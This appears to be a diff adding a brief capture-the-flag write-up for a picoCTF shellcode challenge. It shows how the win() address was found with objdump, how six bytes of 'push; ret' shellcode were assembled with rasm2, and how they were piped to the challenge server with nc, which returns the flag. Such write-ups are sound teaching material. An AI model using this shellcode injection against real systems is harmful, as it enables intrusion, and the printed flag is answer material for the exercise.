@@ -1,0 +1,16 @@
+This shellcode problem was similar to the last one, except we're only allowed to input 10 bytes.
+However, the win() function has been uncommented. If we can figure out the address of the function,
+we can generate our own shellcode to call that function and get the flag.
+
+$ objdump -d shells | grep win
+08048540 <win>:
+
+Now we know the address of the function: 0x8048540, and we can use radare2 to generate shellcode.
+
+$ rasm2 -C "push 0x08048540; ret"
+"\x68\x40\x85\x04\x08\xc3"
+$ echo "\x68\x40\x85\x04\x08\xc3" | nc shell2017.picoctf.com
+My mother told me to never accept things from strangers
+How bad could running a couple bytes be though?
+Give me 10 bytes:
+f4eb30af1eaea58d046faf36595be80e
